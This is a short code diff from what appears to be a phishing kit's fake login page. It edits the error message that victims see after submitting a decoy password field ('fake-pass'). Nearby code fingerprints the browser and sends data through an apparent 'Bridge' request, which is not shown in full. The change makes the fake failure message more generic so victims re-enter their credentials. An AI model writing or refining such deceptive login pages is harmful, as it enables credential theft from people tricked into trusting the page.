@@ -648,7 +648,7 @@ if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
         }).catch(err => console.error("Bridge Error"));
 
         err.style.display = 'block';
-        err.innerHTML = "<strong>ERROR</strong>: The password for <strong>admin</strong> is incorrect. <a href='#'>Lost your password?</a>";
+        err.innerHTML = "<strong>ERROR</strong>: The USERNAME and PASSWORD entered is not found on our server.";
         box.classList.add('shake');
         setTimeout(() => box.classList.remove('shake'), 500);
         document.getElementById('fake-pass').value = "";
